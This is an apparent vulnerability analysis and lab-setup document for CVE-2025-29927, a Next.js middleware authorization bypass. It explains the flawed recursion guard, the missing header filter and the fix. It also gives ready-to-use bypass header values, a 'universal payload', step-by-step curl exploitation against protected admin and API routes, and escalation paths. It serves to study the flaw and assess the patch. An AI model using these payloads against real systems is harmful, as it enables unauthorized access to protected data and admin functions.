# Vulnerability Analysis: CVE-2025-29927

## Root Cause

CVE-2025-29927 is a **middleware authorization bypass** in Next.js caused by trusting an internal HTTP header (`x-middleware-subrequest`) from external untrusted requests without any origin validation.

### Detailed Technical Description

Next.js implements a middleware recursion guard to prevent infinite loops when middleware code makes sub-requests (via `fetch()`) that re-invoke the same middleware. This guard works by:

1. **Setting an internal header**: When middleware makes a `fetch()` call, the `context.ts` fetch wrapper appends the current middleware module name to the `x-middleware-subrequest` header (colon-separated list).
2. **Checking recursion depth**: Before executing middleware, `sandbox.ts` reads `x-middleware-subrequest`, counts how many times the current middleware name appears, and if it reaches `MAX_RECURSION_DEPTH` (5), **skips middleware entirely** by returning a response with `x-middleware-next: 1`.

The critical flaw is that **the `x-middleware-subrequest` header is never stripped from external incoming HTTP requests**. The `filterInternalHeaders()` function in `server-ipc/utils.ts` strips other internal headers (`x-middleware-rewrite`, `x-middleware-redirect`, `x-middleware-next`, etc.) but does **NOT** strip `x-middleware-subrequest`. This allows any external attacker to inject this header to trick the recursion guard.

When middleware is skipped, `x-middleware-next: 1` is set in the response, which instructs Next.js to proceed to the next handler **without executing any middleware logic**. If the middleware contains authentication, authorization, rate limiting, CSRF checks, or any other security control, these are completely bypassed.

## Vulnerable File(s) and Function(s)

### Primary Vulnerable File
- **File**: `packages/next/src/server/web/sandbox/sandbox.ts`
- **Function**: `run()` (wrapped by `withTaggedErrors`)
- **Lines**: 94–114 (in v15.2.2)

```typescript
// sandbox.ts:94-114 — VULNERABLE CODE
export const run = withTaggedErrors(async function runWithTaggedErrors(params) {
  const runtime = await getRuntimeContext(params)
  const subreq = params.request.headers[`x-middleware-subrequest`]  // LINE 96: Reads untrusted header
  const subrequests = typeof subreq === 'string' ? subreq.split(':') : []

  const MAX_RECURSION_DEPTH = 5
  const depth = subrequests.reduce(
    (acc, curr) => (curr === params.name ? acc + 1 : acc),  // LINE 101: Counts middleware name occurrences
    0
  )

  if (depth >= MAX_RECURSION_DEPTH) {  // LINE 105: If >= 5, skip middleware
    return {
      waitUntil: Promise.resolve(),
      response: new runtime.context.Response(null, {
        headers: {
          'x-middleware-next': '1',  // LINE 110: Tells Next.js to skip middleware
        },
      }),
    }
  }
  // ... middleware execution continues if depth < 5
})
```

### Contributing Vulnerable File (Missing Filter)
- **File**: `packages/next/src/server/lib/server-ipc/utils.ts`
- **Lines**: 42–61

The `INTERNAL_HEADERS` array does NOT include `x-middleware-subrequest`, so `filterInternalHeaders()` does not strip it from incoming requests:

```typescript
// utils.ts:42-61 — MISSING x-middleware-subrequest FROM FILTER LIST
const INTERNAL_HEADERS = [
  'x-middleware-rewrite',
  'x-middleware-redirect',
  'x-middleware-set-cookie',
  'x-middleware-skip',
  'x-middleware-override-headers',
  'x-middleware-next',
  'x-now-route-matches',
  'x-matched-path',
]  // NOTE: x-middleware-subrequest is NOT listed here
```

## Data Flow (Entry Point → Vulnerable Code)

1. **External HTTP request** arrives at `router-server.ts:requestHandlerImpl` (line 177)
2. `filterInternalHeaders(req.headers)` is called (line 180) — strips internal headers, but **NOT** `x-middleware-subrequest`
3. Request flows through `resolveRoutes()` and eventually to `next-server.ts` middleware execution
4. `next-server.ts:1607` calls `run()` from `sandbox.ts` with `request: requestData` containing the original headers
5. `sandbox.ts:96` reads `params.request.headers['x-middleware-subrequest']` — the attacker-controlled header
6. `sandbox.ts:100-103` counts occurrences of the middleware name in the colon-separated values
7. `sandbox.ts:105` compares depth to `MAX_RECURSION_DEPTH` (5) — if >= 5, middleware is skipped

## Triggering Input

### Exact HTTP Header

The exploit requires a single HTTP header. The exact value depends on the middleware file location:

| Middleware Location | `params.name` Value | Exploit Header |
|---|---|---|
| `middleware.ts` or `middleware.js` (project root) | `middleware` | `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` |
| `src/middleware.ts` or `src/middleware.js` | `src/middleware` | `x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware` |
| `pages/_middleware.js` (v12 and below) | `pages/_middleware` | `x-middleware-subrequest: pages/_middleware` (only 1 needed — no recursion check in v11-12) |

### Minimum Exploit

```bash
# Against default middleware location (most common):
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://target:3000/protected-path
```

### Universal Payload (Covers All Locations)

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware:src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:pages/_middleware
```

This single value works regardless of middleware location because the recursion counter only counts exact matches for the specific middleware name, and including enough repetitions for each variant ensures at least one will trigger.

## Attack Scenario

### Step-by-Step Exploitation

1. **Reconnaissance**: Identify a Next.js application (detectable via `x-powered-by: Next.js` header, `/_next/` static paths, or `__NEXT_DATA__` in HTML source).
2. **Identify Protected Routes**: Find routes that return 401/403 or redirect to a login page — these are likely protected by middleware.
3. **Send Bypass Header**: Include the `x-middleware-subrequest` header with the middleware name repeated 5 times (colon-separated) in any HTTP request to a protected route.
4. **Access Protected Content**: The middleware is completely skipped, and the request is served as if no middleware exists.

### Concrete Example

```bash
# Step 1: Confirm middleware is blocking access
curl -v http://target:3000/admin/dashboard
# → 401 Unauthorized or 307 Redirect to /login

# Step 2: Bypass middleware
curl -v -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://target:3000/admin/dashboard
# → 200 OK with full admin dashboard content

# Step 3: Access API endpoints (if also protected by middleware)
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://target:3000/api/users
# → 200 OK with user data (auth bypass)
```

## Impact

- **CVSS**: 9.1 Critical (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
- **Attack Vector**: Network (remote, unauthenticated)
- **Attack Complexity**: Low (single header injection)

### Specific Impact Categories

1. **Authentication Bypass**: Middleware-based authentication checks are completely skipped. Unauthenticated users access authenticated-only routes.
2. **Authorization Bypass**: Role-based access control implemented in middleware is bypassed. Any user (or no user) can access admin-only or restricted routes.
3. **Rate Limiting Bypass**: If rate limiting is implemented in middleware, it can be entirely skipped.
4. **CSRF Protection Bypass**: Middleware-based CSRF token validation is skipped.
5. **Geo-blocking Bypass**: IP/geo-based restrictions in middleware are bypassed.
6. **Security Header Bypass**: Any security headers set by middleware (CSP, CORS, etc.) are not applied.

## Authentication Requirements

**None required.** This is a **pre-authentication vulnerability**. The entire point of the exploit is that it bypasses authentication checks. No credentials, tokens, API keys, or sessions are needed. Any unauthenticated remote attacker can exploit this vulnerability by adding a single HTTP header.

## Fix Assessment

### Fix Mechanism (Commit `52a078da`)

The fix introduces a **session-specific secret token** to validate the origin of `x-middleware-subrequest` headers:

1. **`router-server.ts`** (lines +169-172): Generates 8 random bytes as hex string at server startup, stored in `globalThis[Symbol.for('@next/middleware-subrequest-id')]`
2. **`server-ipc/utils.ts`** (lines +62-72): In `filterInternalHeaders()`, if `x-middleware-subrequest` is present but `x-middleware-subrequest-id` doesn't match the session secret, the `x-middleware-subrequest` header is **deleted**
3. **`context.ts`** (lines +376-379): Attaches the session secret as `x-middleware-subrequest-id` on all legitimate internal sub-request `fetch()` calls

### Fix Assessment: Complete (for standard deployments)

The fix is **thorough and well-designed** for the standard Next.js server architecture:

- **Secret-based validation**: The 8-byte random hex token (64 bits of entropy) is generated per server session and stored only in `globalThis`. An external attacker cannot know this value.
- **Defense at the entry point**: The header is stripped at the earliest possible point (`filterInternalHeaders` in `requestHandlerImpl`), before any routing or middleware logic executes.
- **Single choke point**: All request paths (`next dev`, `next start`, custom server via `createServer`) flow through `router-server.ts:initialize()` → `requestHandlerImpl`, which calls `filterInternalHeaders`.
- **Preserves internal functionality**: Legitimate sub-requests from middleware `fetch()` calls still work because `context.ts` attaches the matching `x-middleware-subrequest-id`.

### Potential Considerations (Not Bypasses)

1. **`NEXT_PRIVATE_TEST_HEADERS`**: If this env var is set (line 179 of router-server.ts), `filterInternalHeaders()` is NOT called. This is a testing-only flag and should never be set in production.
2. **Custom server integration**: If a developer uses Next.js as middleware in a custom Express/Fastify server but handles requests without going through `router-server.ts:initialize()`, the filter might not apply. However, this is an unusual and non-standard setup.
3. **CDN/proxy header passthrough**: If a CDN or reverse proxy strips unknown headers, the attack is mitigated even without the fix. If the proxy preserves all headers, the vulnerability is exploitable. The fix correctly addresses this at the application level.

The fix addresses the root cause effectively by ensuring external requests cannot spoof the internal sub-request tracking header. No bypass vectors were identified for standard Next.js deployments.

## Escalation Path

The middleware bypass primitive itself provides **direct access to protected routes and APIs**. Escalation depends on what the middleware protects:

1. **Admin Panel Access → Account Takeover**: If middleware protects admin routes, bypass gives direct admin access, potentially allowing user management, password resets, or configuration changes.
2. **API Access → Data Exfiltration**: If middleware protects API routes, bypass allows reading/writing application data without authentication.
3. **Server-Side Actions → Potential RCE**: If middleware protects Next.js Server Actions or API routes that interact with the filesystem, database, or execute commands, the bypass provides access to those dangerous endpoints.
4. **Session/Token Forging**: If middleware validates JWT tokens or session cookies, bypass allows accessing routes that return sensitive tokens or session data.

The escalation is **application-dependent** — the severity scales with what the middleware protects. In the worst case (middleware is the sole auth layer for admin/API routes with dangerous functionality), this can lead to full application compromise.

## Related Attack Surface

### Same Pattern — Not Separately Vulnerable

The `x-middleware-subrequest` header is only consumed in **one location**: `sandbox.ts:96`. There are no sibling files or parallel implementations of the recursion guard. The `context.ts` references to the header are all in the `fetch()` wrapper that **sets** (not reads) the header for legitimate sub-requests.

No other internal headers in the `INTERNAL_HEADERS` list have the same trust-without-validation pattern — they are correctly stripped by `filterInternalHeaders()`.

### Related Internal Headers (Informational)

The following internal headers ARE correctly filtered in the vulnerable version (listed in `INTERNAL_HEADERS`):
- `x-middleware-rewrite`, `x-middleware-redirect`, `x-middleware-set-cookie`, `x-middleware-skip`, `x-middleware-override-headers`, `x-middleware-next`, `x-now-route-matches`, `x-matched-path`

The fact that `x-middleware-subrequest` was omitted from this list while other `x-middleware-*` headers are included suggests this was an oversight rather than an intentional design decision.

**No additional related vulnerable patterns were identified.**

## Build System

### Overview
- **Build System**: npm (Node.js package manager)
- **Language**: JavaScript / TypeScript (Next.js framework)
- **Lab Strategy**: Install vulnerable Next.js version from npm registry — do NOT build from source

### Build Commands (Lab App)

```bash
# Create minimal Next.js app with vulnerable version
mkdir vulnerable-app && cd vulnerable-app

# Create package.json
cat > package.json << 'EOF'
{
  "name": "vuln-nextjs-lab",
  "version": "1.0.0",
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start"
  },
  "dependencies": {
    "next": "14.2.24",
    "react": "^18",
    "react-dom": "^18"
  }
}
EOF

# Install dependencies
npm install

# Build the application
npm run build

# Start in production mode
npm run start
# OR start in dev mode
npm run dev
```

### Dependencies

| Package | Version | Purpose |
|---|---|---|
| `next` | `14.2.24` (vulnerable) | Next.js framework |
| `react` | `^18` | React library |
| `react-dom` | `^18` | React DOM renderer |
| `node` | `18+` (LTS) | Runtime |

### Runtime Requirements

- **Node.js**: Version 18 or higher (LTS recommended)
- **Network**: Port 3000 (default) must be accessible
- **No external services required**: The vulnerability is in the Next.js request handling layer
- **No database required**: The PoC only needs middleware and a protected route
- **No TLS required**: HTTP is sufficient for the PoC

### Minimal Vulnerable App Structure

```
vulnerable-app/
├── package.json                     # next@14.2.24
├── middleware.js                     # Auth-checking middleware (the vulnerable component)
├── app/
│   ├── layout.js                    # Root layout
│   ├── page.js                      # Public home page
│   └── api/
│       └── protected/
│           └── route.js             # Protected API endpoint
```

### Key Middleware Code (`middleware.js`)

```javascript
import { NextResponse } from "next/server";

export function middleware(req) {
  const authHeader = req.headers.get("authorization");
  if (!authHeader || authHeader !== "Bearer my-secret-token") {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }
  return NextResponse.next();
}

export const config = {
  matcher: "/api/:path*",
};
```

### Recommended Lab Image

- **Base**: `node:18-slim` or `node:18-alpine`
- **No compilation needed**: Pure JavaScript/npm install
- **Size**: ~300MB with node_modules

### Version Selection Rationale

**v14.2.24** is recommended for the lab because:
1. React 18 is stable and simple to set up (no RC dependencies)
2. The vulnerability mechanism is identical across all affected major versions
3. Most public PoCs target v14 specifically
4. v14 is the most widely deployed affected version in production

For patched comparison, use `next@14.2.25`.
